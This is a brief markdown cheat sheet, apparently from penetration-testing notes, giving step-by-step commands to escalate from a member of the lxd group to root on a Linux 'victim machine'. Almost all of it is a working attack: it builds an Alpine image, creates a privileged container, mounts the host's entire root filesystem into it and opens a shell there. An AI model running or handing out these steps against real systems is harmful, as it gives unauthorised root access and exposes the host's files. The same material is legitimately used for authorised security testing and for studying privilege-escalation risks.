# LXD/LXC PE
If your user is part of the LXC containerization group then you may be able to escalate to root!

0. Check you groups(must be part of lxd)
```
id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

1.build a simple alpine image
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
```

2. import the image
```
lxc image import ./alpine*.tar.gz --alias alpine
```
(It's important doing this from YOUR HOME directory on the victim machine, or it might fail.)

3. before running the image, start and configure the lxd storage pool as default 
```
lxd init
```

4. run the image
```
lxc init alpine mycontainer -c security.privileged=true
```
 
5. mount the /root into the image ()
```
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

6.interact with the container
```
lxc start mycontainer
lxc exec mycontainer /bin/sh
surf to /mnt/root/xxxx
```
(the root from the host will be mounted from there)
